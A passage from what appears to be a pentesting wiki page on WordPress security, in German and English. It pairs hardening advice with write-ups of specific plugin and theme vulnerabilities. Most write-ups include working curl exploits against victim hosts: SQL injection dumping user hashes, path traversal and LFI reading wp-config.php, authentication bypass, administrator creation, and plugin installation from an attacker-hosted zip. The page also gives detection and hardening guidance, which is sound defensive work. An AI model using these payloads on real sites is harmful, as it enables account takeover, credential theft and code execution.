- Typische hochkritische F√§lle: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive Hinweise

- Verlass dich nicht auf generische WAF-Signaturen zum Schutz von Plugin-CVEs. Implementiere auf Anwendungsebene abgestimmte, schwachstellenspezifische virtuelle Patches oder aktualisiere schnell.
- Bevorzuge positive-security-Pr√ºfungen im Code (capabilities, nonces, strikte Input-Validierung) statt negativer regex-Filter.

## WordPress-Schutz

### Regelm√§√üige Updates

Stelle sicher, dass WordPress, Plugins und Themes auf dem neuesten Stand sind. Best√§tige au√üerdem, dass automatisches Aktualisieren in wp-config.php aktiviert ist:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Also, **installiere au√üerdem nur vertrauensw√ºrdige WordPress-Plugins und Themes**.

### Sicherheits-Plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Weitere Empfehlungen**

- Entferne den Standardbenutzer **admin**
- Verwende **starke Passw√∂rter** und **2FA**
- √úberpr√ºfe regelm√§√üig die **Berechtigungen** der Benutzer
- Begrenze **Login-Versuche**, um Brute Force attacks zu verhindern
- Benenne die Datei `wp-admin.php` um und erlaube den Zugriff nur intern oder von bestimmten IP-Adressen.


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

Das WP Job Portal recruitment plugin stellte eine **savecategory**-Aufgabe zur Verf√ºgung, die letztendlich den folgenden verwundbaren Code in `modules/category/model.php::validateFormData()` ausf√ºhrt:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Probleme, die durch diesen Ausschnitt entstehen:

1. **Unsanitised user input** ‚Äì `parentid` kommt direkt aus der HTTP-Anfrage.
2. **String concatenation inside the WHERE clause** ‚Äì keine `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** ‚Äì obwohl die Aktion √ºber `admin-post.php` ausgef√ºhrt wird, ist die einzige vorhandene Kontrolle ein **CSRF nonce** (`wp_verify_nonce()`), den jeder Besucher von einer √∂ffentlichen Seite mit dem Shortcode `[wpjobportal_my_resumes]` abrufen kann.

#### Exploitation

1. Grab a fresh nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Inject arbitrary SQL by abusing `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Die Antwort gibt das Ergebnis der injizierten Abfrage preis oder ver√§ndert die Datenbank, was SQLi beweist.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Eine weitere Aufgabe, **downloadcustomfile**, erlaubte Besuchern, **jede Datei auf der Festplatte** via path traversal herunterzuladen. Die verwundbare Stelle befindet sich in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` wird vom Angreifer kontrolliert und ohne **Sanitierung** verkettet. Wieder ist die einzige H√ºrde ein **CSRF nonce**, das von der resume page abgerufen werden kann.

#### Ausnutzung
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Der Server antwortet mit dem Inhalt von `wp-config.php`, leaking DB credentials and auth keys.

## Nicht authentifizierte Konto√ºbernahme via Social Login AJAX-Fallback (Jobmonster Theme <= 4.7.9)

Viele Themes/Plugins liefern "social login"-Hilfsfunktionen, die √ºber admin-ajax.php exponiert sind. Wenn eine nicht authentifizierte AJAX-Aktion (wp_ajax_nopriv_...) client-seitig gelieferte Identifikatoren vertraut, sobald Provider-Daten fehlen, und dann wp_set_auth_cookie() aufruft, wird daraus eine vollst√§ndige Authentifizierungsumgehung.

Typisches fehlerhaftes Muster (vereinfacht)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider ‚Äì execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // üî• logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Warum es ausnutzbar ist

- Unauthentifizierte Erreichbarkeit √ºber admin-ajax.php (wp_ajax_nopriv_‚Ä¶ action).
- Keine nonce-/capability-Pr√ºfungen vor Zustands√§nderungen.
- Fehlende OAuth/OpenID Provider-Verifizierung; der Default-Branch akzeptiert Eingaben des Angreifers.
- get_user_by('email', $_POST['id']) gefolgt von wp_set_auth_cookie($uid) authentifiziert den Anfragenden als jede existierende E-Mail-Adresse.

Ausnutzung (nicht authentifiziert)

- Voraussetzungen: Angreifer kann /wp-admin/admin-ajax.php erreichen und kennt/err√§t eine g√ºltige Benutzer-E-Mail.
- Setze provider auf einen nicht unterst√ºtzten Wert (oder lass ihn weg), um den Default-Branch zu erreichen und id=<victim_email> zu √ºbergeben.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- Ableiten der Identit√§t nicht aus Client-Eingaben. Akzeptiere nur emails/IDs, die von einem validierten Provider-Token/ID stammen.
- Require CSRF nonces and capability checks even for login helpers; avoid registering wp_ajax_nopriv_ unless strictly necessary.
- Validate and verify OAuth/OIDC responses server-side; reject missing/invalid providers (no fallback to POST id).
- Erw√§ge, social login vor√ºbergehend zu deaktivieren oder virtuell am Edge zu patchen (die verwundbare action blockieren), bis ein Fix verf√ºgbar ist.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ‚â§ 1.0.82)

Some plugins expose REST endpoints that mint reusable ‚Äúconnection keys‚Äù or tokens without verifying the caller‚Äôs capabilities. If the route authenticates only on a guessable attribute (e.g., username) and does not bind the key to a user/session with capability checks, any unauthenticated attacker can mint a key and invoke privileged actions (admin account creation, plugin actions ‚Üí RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC ‚Äì mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# ‚Üí {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Warum es ausnutzbar ist
- Sensible REST-Route, die nur durch einen Identit√§tsnachweis mit niedriger Entropie (username) gesch√ºtzt ist oder ein fehlendes permission_callback aufweist
- Keine Durchsetzung von Capabilities; ausgestellter Key wird als universeller Umgehungsmechanismus akzeptiert

Detection checklist
- Plugin-Code nach register_rest_route(..., [ 'permission_callback' => '__return_true' ]) durchsuchen (z. B. mit grep)
- Jede Route, die Tokens/Keys basierend auf der in der Anfrage angegebenen Identit√§t (username/email) ausstellt, ohne diese an einen authentifizierten Benutzer oder eine Capability zu binden
- Suche nach nachfolgenden Routen, die den ausgestellten Token/Key ohne serverseitige Capability-Pr√ºfungen akzeptieren

Hardening
- F√ºr jede privilegierte REST-Route: erfordere ein permission_callback, das current_user_can() f√ºr die erforderliche Capability durchsetzt
- Stelle keine langlebigen Keys aus der vom Client gelieferten Identit√§t aus; falls n√∂tig, gib kurzlebige, an den Benutzer gebundene Tokens nach Authentifizierung aus und √ºberpr√ºfe die Capabilities bei Verwendung erneut
- Validiere den Benutzerkontext des Aufrufers (wp_set_current_user ist allein nicht ausreichend) und lehne Anfragen ab, wenn !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse ‚Üí unauthenticated arbitrary plugin installation (FunnelKit Automations ‚â§ 3.5.3)

Nonces verhindern CSRF, nicht die Autorisierung. Wenn Code einen erfolgreichen Nonce-Check als Freifahrtsschein behandelt und dann Capability-Pr√ºfungen f√ºr privilegierte Operationen (z. B. installieren/aktivieren von Plugins) √ºberspringt, k√∂nnen nicht authentifizierte Angreifer eine schwache Nonce-Anforderung erf√ºllen und durch Installation eines mit Backdoor versehenen oder verwundbaren Plugins RCE erreichen.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce ‚Äúpasses‚Äù
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Erkennungs-Checkliste
- REST/AJAX-Handler, die Plugins/Themes √§ndern und nur wp_verify_nonce()/check_admin_referer() verwenden und keinen capability check durchf√ºhren
- Jeder Codepfad, der $skip_caps = true setzt, nachdem die Nonce validiert wurde

H√§rtung
- Behandle nonces immer nur als CSRF tokens; erzwinge capability checks unabh√§ngig vom Nonce-Status
- Erfordere current_user_can('install_plugins') und current_user_can('activate_plugins'), bevor Installer-Code erreicht wird
- Verweigere nicht-authentifizierten Zugriff; vermeide das Offenlegen von nopriv AJAX actions f√ºr privilegierte Abl√§ufe

---

## Nicht-authentifizierter SQLi √ºber den s (search)-Parameter in depicter-* Aktionen (Depicter Slider ‚â§ 3.6.1)

Mehrere depicter-* Aktionen verwendeten den s (search)-Parameter und setzten ihn ohne Parameterisierung in SQL-Abfragen ein.

- Parameter: s (search)
- Fehler: direkte String-Verkettung in WHERE/LIKE-Klauseln; keine prepared statements/sanitization
- Auswirkung: Datenbank-Exfiltration (Benutzer, Hashes), laterale Bewegung

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep nach depicter-* Action-Handlern und nach direkter Verwendung von $_GET['s'] oder $_POST['s'] in SQL
- √úberpr√ºfe benutzerdefinierte Abfragen, die an $wpdb->get_results()/query() √ºbergeben werden und das s-Parameter per Verkettung verwenden

Hardening
- Verwende immer $wpdb->prepare() oder wpdb-Placeholders; lehne unerwartete Metazeichen serverseitig ab
- F√ºge eine strikte Allowlist f√ºr s hinzu und normalisiere auf erwarteten Zeichensatz/L√§nge

---

## Unauthenticated Local File Inclusion √ºber einen nicht validierten Template-/Dateipfad (Kubio AI Page Builder ‚â§ 2.5.1)

Die Annahme vom Angreifer kontrollierter Pfade in einem Template-Parameter ohne Normalisierung/Einschr√§nkung erm√∂glicht das Lesen beliebiger lokaler Dateien und manchmal Codeausf√ºhrung, wenn einbindbare PHP-/Log-Dateien zur Laufzeit eingebunden werden.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: keine Normalisierung/Allowlisting; Traversal erlaubt
- Impact: Offenlegung geheimer Daten (wp-config.php), potentielles RCE in bestimmten Umgebungen (log poisoning, includable PHP)

PoC ‚Äì wp-config.php lesen
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Checkliste zur Erkennung
- Jeder Handler, der Request-Pfade in include()/require()/read-Sinks verkettet, ohne realpath()-Containment
- Auf Traversal-Muster (../) achten, die au√üerhalb des vorgesehenen Templates-Verzeichnisses gelangen

Hardening
- Allowlist f√ºr Templates durchsetzen; mit realpath() aufl√∂sen und require str_starts_with(realpath(file), realpath(allowed_base))
- Eingaben normalisieren; Traversal-Sequenzen und absolute Pfade ablehnen; sanitize_file_name() nur f√ºr Dateinamen verwenden (nicht f√ºr komplette Pfade)


## Referenzen

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025‚Äôs most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ‚â§ 1.0.82 ‚Äì Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ‚â§ 3.5.3 ‚Äì Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ‚â§ 3.6.1 ‚Äì Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ‚â§ 2.5.1 ‚Äì Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
